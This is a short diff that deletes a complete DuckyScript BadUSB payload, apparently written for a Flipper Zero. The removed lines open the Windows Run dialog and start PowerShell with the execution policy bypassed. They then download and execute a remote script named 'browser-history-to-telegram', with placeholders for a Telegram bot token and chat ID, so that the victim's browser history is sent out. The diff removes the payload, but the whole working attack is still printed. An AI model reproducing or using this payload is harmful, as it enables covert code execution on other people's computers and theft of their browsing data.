@@ -1,8 +1,0 @@
-DELAY 1000
-GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $hide='y'
-ENTER
-DELAY 1000
-STRING powershell -Ep Bypass -C $hide='y';$tg='TGBotToken';$ChatID='Your telegram ID';iex (irm https://github.com/kr3v3tochka/bad_usb_for_flipper/blob/main/browser-history-to-telegram/main.ps1)
-ENTER 
